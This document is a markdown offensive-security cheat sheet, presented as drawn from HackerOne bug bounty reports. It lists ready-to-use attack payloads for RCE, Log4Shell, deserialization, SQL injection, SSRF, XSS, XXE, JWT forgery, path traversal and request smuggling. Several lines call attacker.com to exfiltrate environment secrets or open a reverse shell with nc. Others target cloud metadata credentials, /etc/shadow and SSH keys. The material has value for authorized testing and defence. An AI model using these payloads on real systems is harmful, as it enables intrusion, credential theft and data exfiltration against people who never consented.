# HackerOne Attack Patterns - Real-World Exploitation Reference

## Overview

This comprehensive reference is derived from analysis of 6,894 HackerOne bug bounty reports across 157 vulnerability categories. These are real-world attack patterns, payloads, and techniques that have been used to discover actual vulnerabilities in production systems.

---

## TIER 1: HIGH-IMPACT VULNERABILITIES

### 1. Remote Code Execution (RCE) - 327 Reports

#### Command Concatenation Patterns

**Node.js/JavaScript RCE:**
```javascript
// Vulnerable pattern: treekill-style concatenation
const userInput = request.body.pid
exec("kill -9 " + userInput)  // VULNERABLE

// Exploitation:
// pid = "1234+%26+whoami"  (URL encoded)
// pid = "1234; cat /etc/passwd"
// pid = "`id`"
// pid = "$(whoami)"

// Windows-specific:
// pid = "1234 & dir"
// pid = "1234 | type C:\\Windows\\System32\\config\\SAM"
```

**Python RCE Patterns:**
```python
# Pickle deserialization
import pickle
import base64

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE()))

# eval/exec injection
user_input = "__import__('os').system('id')"
eval(user_input)  # RCE
```

**PHP RCE Patterns:**
```php
// Dangerous functions to test:
system($input);
exec($input);
shell_exec($input);
passthru($input);
popen($input, "r");
proc_open($input, $descriptors, $pipes);
assert($input);  // PHP < 7.0
preg_replace('/e', $input, '');  // PHP < 5.5
create_function('', $input);

// Payloads:
$input = "; id";
$input = "| cat /etc/passwd";
$input = "`whoami`";
$input = "$(cat /etc/shadow)";
```

#### Log4Shell (CVE-2021-44228) Exploitation

```
# Basic JNDI injection payloads
${jndi:ldap://attacker.com/a}
${jndi:rmi://attacker.com/a}
${jndi:dns://attacker.com/a}

# Bypass WAF patterns
${${lower:j}ndi:${lower:l}dap://attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//attacker.com/a}
${${lower:${lower:jndi}}:${lower:ldap}://attacker.com/a}
${${upper:j}${upper:n}${upper:d}${upper:i}:${upper:l}${upper:d}${upper:a}${upper:p}://attacker.com/a}

# Data exfiltration via DNS
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.attacker.com/a}
${jndi:ldap://${sys:user.name}.${hostName}.attacker.com/a}
${jndi:ldap://${java:version}.attacker.com/a}

# Test in these locations:
- User-Agent header
- X-Forwarded-For header
- Referer header
- Any search/input field
- File upload filename
- Cookie values
- API JSON fields
```

#### Deserialization Attacks

**.NET Deserialization:**
```csharp
// Vulnerable ViewState patterns
// Look for: __VIEWSTATE parameter without MAC validation

// Generate payloads with ysoserial.net:
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "calc.exe"
ysoserial.exe -g ActivitySurrogateSelector -f ObjectStateFormatter -c "cmd /c whoami > C:\\output.txt"

// BinaryFormatter exploitation
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "powershell -enc <base64>"
```

**Java Deserialization:**
```bash
# Generate payloads with ysoserial
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/$(whoami)" | base64
java -jar ysoserial.jar CommonsBeanutils1 "nc -e /bin/sh attacker.com 4444"
java -jar ysoserial.jar Spring1 "id > /tmp/pwned"

# Target headers/cookies containing serialized data:
# - JSESSIONID (if custom)
# - Remember-me tokens
# - API tokens
```

---

### 2. HTTP Request Smuggling - 51 Reports

#### CRLF Injection Patterns

```
# Basic CRLF injection
param=value%0d%0aX-Injected-Header:attack
param=value%0aSet-Cookie:admin=true

# HTTP Response Splitting
param=%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>

# Request smuggling via Host header (Cloudflare Origin Rules pattern)
Host: example.com%0d%0aX-Injected: smuggled
host_header: target.com\r\nX-Forwarded-Host: attacker.com

# Various encoding bypasses:
%0d%0a     # Standard CRLF
%0a        # Just LF (works on some servers)
%0d        # Just CR
%c0%8d     # Overlong UTF-8 encoding
%e5%98%8a  # UTF-8 encoding bypass
```

#### CL.TE and TE.CL Smuggling

```http
# CL.TE (Content-Length takes precedence for front-end, TE for back-end)
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL (Transfer-Encoding takes precedence for front-end, CL for back-end)
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# Obfuscated TE headers (bypass WAF)
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
 : chunked
```

---

### 3. Authentication Bypass - 261 Reports

#### JWT Attack Patterns

```python
# Algorithm confusion attack (RS256 -> HS256)
# When server uses RS256 but accepts HS256
import jwt

public_key = open('public.pem').read()
forged_token = jwt.encode(
    {"user": "admin", "role": "admin"},
    public_key,
    algorithm='HS256'
)

# None algorithm attack
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "admin": true}
token = base64url(header) + "." + base64url(payload) + "."

# JKU/X5U header injection
header = {
    "alg": "RS256",
    "jku": "https://attacker.com/jwks.json"  # Attacker-controlled JWKS
}

# Kid injection for path traversal
header = {
    "alg": "HS256",
    "kid": "../../../../../../dev/null"  # Signs with empty key
}

# JWT tool payloads
jwt_tool.py <token> -X a  # Algorithm none attack
jwt_tool.py <token> -X k  # Key confusion attack
jwt_tool.py <token> -X s  # Signature bypass
```

#### Session Fixation/Hijacking

```markdown
# Session Fixation Test Flow:
1. Get session ID as anonymous user: SESSIONID=abc123
2. Force victim to use: https://target.com/login?SESSIONID=abc123
3. Victim logs in
4. Attacker uses same SESSIONID to access authenticated session

# Session ID prediction patterns to test:
- Sequential: session_001, session_002
- Timestamp-based: 1704067200_user123
- Weak hash: md5(username + timestamp)
- Predictable seed: base64(user_id + role)

# Cookie security flags to verify:
- HttpOnly: Prevents JavaScript access
- Secure: HTTPS only
- SameSite=Strict: Prevents CSRF
- Domain: Should not be too broad
- Path: Should be restrictive
```

#### OAuth/SAML Bypass

```markdown
# OAuth state parameter bypass
1. Start OAuth flow, capture state parameter
2. Initiate another flow with attacker's state
3. CSRF attack links victim to attacker's account

# OAuth redirect_uri bypass
redirect_uri=https://attacker.com  # Direct
redirect_uri=https://target.com@attacker.com  # Authority confusion
redirect_uri=https://target.com%2F..%2F..%2Fattacker.com  # Path traversal
redirect_uri=https://target.com.attacker.com  # Subdomain
redirect_uri=https://target.com%00.attacker.com  # Null byte

# SAML signature bypass
- Remove signature entirely
- Self-sign with attacker key
- XML comment injection in signed content
- SAML response replay
```

---

### 4. Server-Side Request Forgery (SSRF) - 176 Reports

#### SSRF Payloads by Cloud Provider

**AWS Metadata:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# IMDSv2 bypass (requires token)
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
```

**Google Cloud:**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Requires header: Metadata-Flavor: Google
```

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Requires header: Metadata: true
```

#### SSRF Bypass Techniques

```markdown
# IP address bypass patterns
127.0.0.1
127.1
127.0.1
0.0.0.0
0
localhost
LOCALHOST
LocalHost
127.0.0.1.nip.io
127.0.0.1.xip.io
spoofed.burpcollaborator.net → resolves to 127.0.0.1

# Decimal/Hex/Octal conversion
2130706433           # Decimal for 127.0.0.1
0x7f000001           # Hex for 127.0.0.1
0177.0.0.01          # Octal
0x7f.0x0.0x0.0x1     # Mixed hex

# IPv6 variants
::1
0000::1
::ffff:127.0.0.1
[::1]
[0:0:0:0:0:ffff:127.0.0.1]

# URL encoding bypass
http://%31%32%37%2e%30%2e%30%2e%31/  # URL encoded 127.0.0.1
http://127.0.0.1%00.attacker.com/    # Null byte
http://127.0.0.1%23@attacker.com/    # Fragment
http://attacker.com#@127.0.0.1/       # Fragment confusion

# DNS rebinding
1. Register domain with short TTL
2. First resolution: allowed-ip
3. Second resolution: 127.0.0.1
4. Application validates first, uses second

# Protocol wrappers
file:///etc/passwd
dict://127.0.0.1:6379/INFO
gopher://127.0.0.1:25/_HELO%20localhost
sftp://attacker-server/
tftp://attacker-server/file
ldap://127.0.0.1/
```

#### Blind SSRF Detection

```markdown
# Out-of-band detection methods
1. Burp Collaborator: https://your-id.burpcollaborator.net
2. Interactsh: https://your-id.oast.fun
3. RequestBin: https://requestbin.com/r/your-id
4. Webhook.site: https://webhook.site/your-uuid

# DNS-based exfiltration
url=http://$(whoami).attacker.com
url=http://${AWS_SECRET_KEY}.attacker.com

# Time-based detection
url=http://127.0.0.1:22  # SSH - should be slow/timeout
url=http://127.0.0.1:3389  # RDP
url=http://127.0.0.1:6379  # Redis - internal service
```

---

### 5. SQL Injection - 141 Reports

#### Advanced SQLi Techniques

**Error-Based Extraction (MySQL):**
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

**Time-Based Blind (Multiple DBs):**
```sql
# MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--

# PostgreSQL
'; SELECT pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

# MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--

# Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a'--
' AND 1=DBMS_LOCK.SLEEP(5)--

# SQLite
' AND 1=randomblob(300000000)--
```

**Out-of-Band (OOB) Exfiltration:**
```sql
# MySQL (requires FILE privilege)
SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'));
SELECT * INTO OUTFILE '\\\\attacker.com\\share\\data.txt';

# MSSQL
EXEC master..xp_dirtree '\\attacker.com\share'
EXEC master..xp_fileexist '\\attacker.com\share'

# Oracle
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM DUAL;
SELECT HTTPURITYPE('http://attacker.com/'||user).GETCLOB() FROM DUAL;

# PostgreSQL
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/'||current_user;
```

**WAF Bypass Techniques:**
```sql
# Comment bypass
/*!50000SELECT*/ * FROM users
SELECT/*comment*/username/**/FROM/**/users

# Case manipulation
SeLeCt * FrOm users

# Encoding
SELECT CHAR(0x41)  # Returns 'A'
SELECT UNHEX('4D7953514C')  # Returns 'MySQL'

# Whitespace alternatives
SELECT%0A*%0D%0AFROM%09users
SELECT%00username%00FROM%00users

# String concatenation (bypass keyword filters)
'SEL'||'ECT'  # PostgreSQL/Oracle
'SEL'+'ECT'   # MSSQL
CONCAT('SEL','ECT')  # MySQL

# Scientific notation
SELECT 1e0FROM users  # MySQL interprets 1e0 as 1.0
```

---

### 6. Cross-Site Scripting (XSS) - 980 Reports

#### Context-Specific Payloads

**HTML Context:**
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<video><source onerror="alert(1)">
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<meter onmouseover=alert(1)>0</meter>
<isindex type=image src=1 onerror=alert(1)>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<iframe src="javascript:alert(1)">
<iframe srcdoc="<script>alert(1)</script>">
<math><maction xlink:href="javascript:alert(1)">click
<form><button formaction="javascript:alert(1)">X
```

**Attribute Context:**
```html
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
" onclick=alert(1) x="
" onfocusin=alert(1) autofocus x="
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
' onfocus=alert(1) autofocus='
`-alert(1)-`
```

**JavaScript Context:**
```javascript
'-alert(1)-'
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
${alert(1)}
{{constructor.constructor('alert(1)')()}}
[].constructor.constructor('alert(1)')()
```

**URL Context:**
```
javascript:alert(1)
javascript:/**/alert(1)
javascript://%0aalert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

#### XSS Filter Bypass

```html
# Case variation
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>

# Tag manipulation
<scr<script>ipt>alert(1)</script>
<script/x>alert(1)</script>
<script    >alert(1)</script>

# Encoding bypass
<script>alert&#x28;1&#x29;</script>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">X</a>

# Unicode normalization bypass
<script>ａｌｅｒｔ(1)</script>  # Fullwidth characters

# Null bytes
<scri%00pt>alert(1)</script>
<img src=x onerror%00=alert(1)>

# Newlines and tabs
<img src=x one\nrror=alert(1)>
<img src=x onerror	=	alert(1)>

# Expression-based (IE)
<div style=x:expression(alert(1))>
<div style="background:url('javascript:alert(1)')">

# SVG-specific
<svg/onload=alert(1)>
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>

# MathML-based
<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICKME</maction></math>
```

#### DOM XSS Sinks and Sources

```javascript
// Dangerous Sinks (where data ends up):
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
document.writeln(userInput);
eval(userInput);
setTimeout(userInput);
setInterval(userInput);
new Function(userInput);
location = userInput;
location.href = userInput;
location.assign(userInput);
location.replace(userInput);
element.src = userInput;
element.setAttribute('onclick', userInput);
$.html(userInput);
$('#id').html(userInput);
element.insertAdjacentHTML('beforebegin', userInput);

// Common Sources (where data comes from):
location.hash
location.search
location.href
location.pathname
document.URL
document.documentURI
document.referrer
document.cookie
window.name
postMessage data
localStorage/sessionStorage
IndexedDB
```

---

### 7. Business Logic Flaws - 230 Reports

#### Price Manipulation Patterns

```markdown
# Intercept and modify price in request
POST /api/checkout HTTP/1.1
{
  "product_id": "12345",
  "quantity": 1,
  "price": 0.01  # Changed from 99.99
}

# Negative quantity attack
{
  "items": [
    {"id": "expensive", "quantity": 1, "price": 1000},
    {"id": "cheap", "quantity": -1, "price": 999}  # Negative = credit
  ]
  # Total = $1 instead of $1000
}

# Currency manipulation
{
  "amount": 100,
  "currency": "VND"  # Vietnamese Dong (~0.004 USD)
}

# Voucher/discount stacking
POST /apply-voucher
{"code": "SAVE50", "code": "SAVE50", "code": "SAVE50"}  # Apply 3x

# Floating point precision abuse
{
  "amount": 0.000001,  # Round to 0
  "quantity": 1000000
}
```

#### Workflow Bypass

```markdown
# Skip steps in multi-step process
Normal flow: /step1 → /step2 → /step3 → /confirm
Attack: /step1 → /confirm (skip payment)

# State manipulation
1. Start flow: POST /booking/start → state_token=abc
2. Complete booking: POST /booking/confirm?state=abc&seats=10
   # But never passed through payment step

# Race condition exploitation
# Double-spend vulnerability
import asyncio
import aiohttp

async def exploit():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(10):
            tasks.append(session.post('/redeem-voucher', json={"code": "ONETIME"}))
        results = await asyncio.gather(*tasks)
        # Check if voucher redeemed multiple times

# Ticket/seat booking bypass (from HackerOne report)
# Change: addon-268-number-of-seats-0 from 3 to 10
# Result: $0 charge for extra seats
```

---

### 8. Path Traversal & File Disclosure - 168 Reports

#### Path Traversal Payloads

```markdown
# Basic traversal
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
..%252f..%252f..%252fetc%252fpasswd  # Double encoding
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd  # Overlong UTF-8

# Windows paths
..\..\..\windows\system32\config\SAM
..%5c..%5c..%5cwindows%5csystem32%5cconfig%5cSAM
....\\....\\....\\windows\\system32\\config\\SAM

# Null byte injection (older systems)
../../../etc/passwd%00.jpg
../../../etc/passwd\x00.png

# Cisco ASA VPN pattern (from HackerOne)
GET /+CSCOE+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/../../../../../etc/passwd
GET /+CSCOE+/session_password.html?session=/../../../../../../../etc/passwd

# LFI to RCE via log poisoning
1. Inject PHP in User-Agent: <?php system($_GET['c']); ?>
2. Access log: /var/log/apache2/access.log
3. Include log file via LFI
4. Execute: ?page=/var/log/apache2/access.log&c=id

# Interesting files to target:
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/auth.log
/var/log/apache2/access.log
~/.ssh/id_rsa
~/.bash_history
/app/.env
/app/config/database.yml
/app/wp-config.php
```

---

### 9. IDOR (Insecure Direct Object References) - 230 Reports

#### IDOR Testing Patterns

```markdown
# User profile IDOR
GET /api/user/123/profile  # Your ID
GET /api/user/124/profile  # Another user's ID

# Document access
GET /api/documents/abc-123-def  # Your document
GET /api/documents/abc-124-def  # Predictable pattern

# Order/invoice access
GET /orders/ORD-2024-00001  # Your order
GET /orders/ORD-2024-00002  # Another order

# API with multiple identifiers
GET /api/org/123/user/456/data  # Change both org and user IDs

# IDOR via parameter pollution
GET /profile?id=123&id=456  # Which ID is used?
GET /profile?user_id=123&id=456  # Parameter confusion

# IDOR via HTTP method change
GET /api/users/123 → 200 OK (your data)
GET /api/users/456 → 403 Forbidden
PUT /api/users/456 → 200 OK (method-based bypass!)

# IDOR via file reference
/download?file=reports/my_report.pdf
/download?file=reports/admin_report.pdf

# UUID/GUID prediction
- Check if UUIDs are v1 (timestamp-based) → predictable
- Check for sequential generation patterns
- Look for UUID leakage in other endpoints
```

---

### 10. Information Disclosure - 605 Reports

#### Sensitive Data Exposure Patterns

```markdown
# JavaScript hardcoded secrets (from HackerOne)
# Scan JS files for:
grep -E "(api_key|apiKey|api-key|secret|password|token|auth)" *.js

# Common exposure patterns:
const API_KEY = "sk-live-xxxxxxxxxxxx";
window.config = {apiKey: "xxxxx", secret: "yyyy"};
headers: {"Authorization": "Bearer eyJ..."}

# Git exposure
/.git/config
/.git/HEAD
/.git/logs/HEAD
/.git/objects/pack/
# Use git-dumper to extract repo

# Environment files
/.env
/.env.local
/.env.production
/.env.backup
/config/.env
/app/.env

# Backup files
/config.php.bak
/database.sql
/backup.zip
/site.tar.gz
/db_backup.sql

# Debug/error information
- Stack traces revealing file paths
- Database errors with query details
- Internal IP addresses
- Library versions
- User IDs in error messages

# Source code via ImageMagick (from HackerOne)
# Malformed GIF triggers memory leak
# Leaked memory contains:
- Database records
- Session tokens
- Internal URLs
- Credentials

# API documentation exposure
/swagger.json
/api-docs
/openapi.json
/graphql (introspection)
```

---

### 11. Memory Corruption Patterns - 177 Reports

#### ImageMagick Vulnerabilities

```markdown
# ImageMagick uninitialized memory leak via GIF
# Using gifoeb tool to generate malicious GIF

# Payload generation:
gifoeb -o malicious.gif -w 100 -h 100

# Upload to target image processing endpoint
# Response may contain leaked memory:
- Database records
- Previous requests
- Credentials
- Session data

# ImageMagick command injection (ImageTragick)
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context

# MVG command execution
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://example.com/x.png"|curl "http://attacker.com/?$(id)'
pop graphic-context

# Ghostscript exploitation
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

---

### 12. Subdomain Takeover - 169 Reports

#### Dangling DNS Detection

```markdown
# Check for CNAME to abandoned services
dig subdomain.target.com CNAME

# Vulnerable CNAME patterns:
subdomain.target.com → *.s3.amazonaws.com (bucket deleted)
subdomain.target.com → *.herokuapp.com (app deleted)
subdomain.target.com → *.github.io (repo deleted)
subdomain.target.com → *.azurewebsites.net (app deleted)
subdomain.target.com → *.cloudfront.net (distribution deleted)
subdomain.target.com → *.shopify.com (store deleted)
subdomain.target.com → *.zendesk.com (account deleted)
subdomain.target.com → ghs.google.com (GSuite misconfigured)
subdomain.target.com → *.ghost.io (blog deleted)

# Takeover process:
1. Find dangling CNAME
2. Register the resource at the provider
3. Claim the subdomain
4. Serve malicious content / steal cookies

# GSuite/Google Workspace takeover:
1. subdomain.target.com → ghs.google.com
2. Register Google Workspace
3. Add domain alias (requires DNS TXT verification)
4. If TXT not properly scoped, you can claim subdomain

# Impact:
- Cookie theft (if parent domain cookies)
- Phishing
- SEO hijacking
- Email interception (MX records)
```

---

### 13. Denial of Service (DoS) - 256 Reports

#### Resource Exhaustion Patterns

```markdown
# Infinite redirect loop (from HackerOne)
https://target.com/en-us%0a/en-us%0a/en-us%0a/...  # Repeated 100x
# Results in 502 Bad Gateway within minutes

# ReDoS (Regular Expression DoS)
# Evil regex: (a+)+$
# Payload: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!

# XML Billion Laughs
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ...
]>
<lolz>&lol9;</lolz>

# GraphQL complexity attack
query {
  posts(first: 1000) {
    author { posts(first: 1000) {
      author { posts(first: 1000) {
        # Deeply nested = exponential load
      }}
    }}
  }
}

# Hash collision DoS (older systems)
# Send POST with specially crafted keys that all hash to same value

# Zip bomb
# Create nested zip that expands to petabytes

# Long URL/parameter DoS
GET /search?q=AAAA...x100000
POST /api with 10MB JSON body
```

---

## TIER 2: MEDIUM-IMPACT VULNERABILITIES

### CSRF Advanced Patterns - 160 Reports

```markdown
# Grafana 0-Day CSRF Chain (from HackerOne):
1. Create attacker.html with iframe
2. Iframe loads Grafana login with attacker credentials
3. CSRF creates SSRF datasource: cookie_samesite=none
4. Chain SSRF to internal services
5. Exfiltrate data via authenticated API calls

# SameSite=None CSRF
Set-Cookie: session=abc123; SameSite=None; Secure
# Cookie sent with cross-origin requests → CSRF possible

# JSON CSRF
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"user":"admin","action":"delete","ignore":"' value='"}'>
</form>
# Sends: {"user":"admin","action":"delete","ignore":"="}

# Flash-based CSRF (legacy)
# Crossdomain.xml misconfiguration allows cross-origin requests
```

---

### Open Redirect - 125 Reports

```markdown
# Basic payloads
?redirect=https://evil.com
?url=//evil.com
?next=https:evil.com
?return=///evil.com
?goto=https://target.com@evil.com

# Protocol-relative
//evil.com
\/\/evil.com
/\/evil.com

# Unicode normalization
?redirect=https://target.com%E3%80%82evil.com

# Bypass common filters
?redirect=https://target.com.evil.com
?redirect=https://evil.com#target.com
?redirect=https://evil.com?target.com
?redirect=https://evil.com\@target.com
?redirect=https://target.com%2f%2fevil.com
?redirect=https://targetcom.evil.com
?redirect=//google%E3%80%82com

# Data URI redirect
?redirect=data:text/html,<script>location='https://evil.com'</script>
```

---

### XXE (XML External Entity) - 14 Reports

```xml
<!-- Basic XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- Blind XXE with OOB -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<data>test</data>

<!-- xxe.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;

<!-- XXE in SVG upload -->
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>

<!-- XXE in XLSX (Office document) -->
# Unzip XLSX, modify xl/workbook.xml or [Content_Types].xml
# Add XXE payload, rezip

<!-- PHP expect wrapper RCE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
```

---

## TESTING METHODOLOGY

### Reconnaissance Phase

```bash
# Subdomain enumeration
subfinder -d target.com -o subs.txt
amass enum -d target.com -o subs.txt
assetfinder target.com >> subs.txt

# Port scanning
nmap -sV -sC -p- target.com
masscan -p1-65535 target.com --rate=1000

# Web technology fingerprinting
whatweb target.com
wappalyzer-cli target.com

# JavaScript analysis
# Extract endpoints from JS files:
cat app.js | grep -oE '"(/[^"]+)"' | sort -u

# API discovery
ffuf -u https://target.com/FUZZ -w api-wordlist.txt
```

### Active Testing Workflow

```markdown
1. CRAWL with JavaScript execution
   - Map all endpoints
   - Identify input vectors
   - Capture API calls

2. TEST authentication first
   - Default credentials
   - Password policies
   - Session management
   - JWT vulnerabilities

3. TEST authorization
   - IDOR on all parameters with IDs
   - Privilege escalation
   - Access control bypass

4. TEST injection points
   - XSS in all contexts
   - SQL injection with all payloads
   - Command injection
   - Template injection

5. TEST business logic
   - Workflow bypass
   - Price manipulation
   - Race conditions

6. TEST for SSRF
   - Any URL parameters
   - Webhook endpoints
   - Image/file processors

7. TEST file operations
   - Upload restrictions
   - Path traversal
   - LFI/RFI

8. CHECK configurations
   - Security headers
   - CORS policy
   - Exposed files
   - Debug modes
```

---

## TOOLS AND RESOURCES

### Essential Tools

```bash
# Nuclei - CVE scanning
nuclei -l urls.txt -t nuclei-templates/

# SQLMap - SQL injection
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# XSStrike - XSS discovery
xsstrike -u "https://target.com/search?q=test"

# Dalfox - DOM XSS
dalfox url "https://target.com/search?q=test"

# FFuf - Fuzzing
ffuf -u "https://target.com/FUZZ" -w wordlist.txt

# Arjun - Parameter discovery
arjun -u "https://target.com/api"

# JWT_Tool - JWT attacks
jwt_tool.py <token> -X a

# Git-dumper - Git exposure
git-dumper https://target.com/.git/ output/
```

### Wordlists

```bash
# SecLists
/SecLists/Discovery/Web-Content/common.txt
/SecLists/Fuzzing/XSS/
/SecLists/Fuzzing/SQLi/
/SecLists/Passwords/Default-Credentials/

# Custom patterns from HackerOne
- API endpoints from disclosed reports
- Known vulnerable parameters
- Common misconfigurations
```

---

## PAYLOAD QUICK REFERENCE

### Universal Testing Payloads

```markdown
# XSS (test all inputs)
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
{{constructor.constructor('alert(1)')()}}

# SQLi (test all parameters)
' OR '1'='1'--
' UNION SELECT NULL--
' AND SLEEP(5)--
{"$ne": null}

# Command Injection
; id
| whoami
`id`
$(whoami)

# Path Traversal
../../../etc/passwd
....//....//etc/passwd
..%252f..%252fetc%252fpasswd

# SSRF
http://169.254.169.254/latest/meta-data/
http://127.0.0.1:22
http://[::1]/

# CRLF
%0d%0aX-Injected:header
%0aSet-Cookie:admin=true
```

---

*This reference is derived from analysis of 6,894 HackerOne reports. Use responsibly for authorized security testing only.*
